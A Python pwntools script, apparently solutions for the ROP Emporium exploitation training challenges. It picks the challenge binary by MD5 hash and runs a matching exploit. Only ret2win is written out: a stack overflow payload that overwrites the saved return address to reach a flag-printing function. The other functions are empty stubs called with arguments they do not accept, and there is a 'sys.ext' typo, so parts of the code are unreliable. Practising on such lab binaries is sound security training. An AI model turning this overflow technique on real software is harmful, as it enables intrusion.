from enum import Enum
#import subprocess
import argparse
import hashlib
import os
import sys
from pwn import *


def ret2win(path):

    payload = b''
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # RBP
    payload += b'\x11\x08\x40\x00\x00\x00\x00\x00' # RIP

    p = process(path)
    p.sendline(payload)
    # p.interactive() if in doubt use interactive() after sendline() ...
    p.recvuntil("Here's your flag:")
    flag = p.recvline()
    success(flag)

    return True

def split():
    pass


def callme():
    pass


def write4():
    pass


def badchars():
    pass


def fluff():
    pass


def pivot():
    pass


def ret2csu():
    pass


def __get_file_md5(path):
    """
    Compute the md5 of the target to exploit.
    :param path: Path of a binary file.
    :return: String representation of the computed md5.
    """
    with open(path, "rb") as f:
        raw = f.read()
    return hashlib.md5(raw).hexdigest()


def identify_chall(path):
    """
    Retrieve a "unique" identifier.
    :param path: Absolute path of the binary to exploit.
    :return: Integer used later in the switcher{}.
    """
    # md5 of the different binaries
    challs = Enum("chall",
                  "5749c330b9364a674ab0a2c050584a1a \
                  5122eddf06a4bb23c1e91c0f823ad17e \
                  4d8865be3afafea6bbbf7ccc943c2097 \
                  c592b9b8dcb413fef52937405b6b214d \
                  4f199566bff332a79fc43c2827876afc \
                  0a3b4de9628fc4578ba3d2db3154781a \
                  b9f679c38ddfd6409924997b56afcea8 \
                  2b6e06fb5babcc6787ca30f8a3465e3f")

    md5 = __get_file_md5(path)

    return challs[md5].value


if __name__ == "__main__":

    # main.py needs to be in the same folder as the file "flag.txt"

    parser = argparse.ArgumentParser(description="Solutions to ROP Emporium challenges")
    parser.add_argument("binary", help="Target binary to exploit")

    args = parser.parse_args()

    chall_id = 0
    abs_path = ""
    rel_path = args.binary

    # Check path && identify challenge
    if os.path.exists(rel_path):
        abs_path = os.path.abspath(rel_path)
        if len(abs_path) == 0:
            print("Can get abolute path of {}".format(rel_path))
            sys.exit(0)

        chall_id = identify_chall(abs_path)

    if chall_id == 0:
        print("Challenge id not found.")
        sys.ext(0)

    # Switch case according to challenge id, so the correct exploit function is called.
    # https://stackoverflow.com/questions/41698247/executing-functions-within-switch-dictionary/41698287
    switcher = {
        1: lambda: ret2win(abs_path),
        2: lambda: split(abs_path),
        3: lambda: callme(abs_path),
        4: lambda: write4(abs_path),
        5: lambda: badchars(abs_path),
        6: lambda: fluff(abs_path),
        7: lambda: pivot(abs_path),
        8: lambda: ret2csu(abs_path)
    }

    # Call the exploit function relevant to the challenge id
    switcher.get(chall_id)()

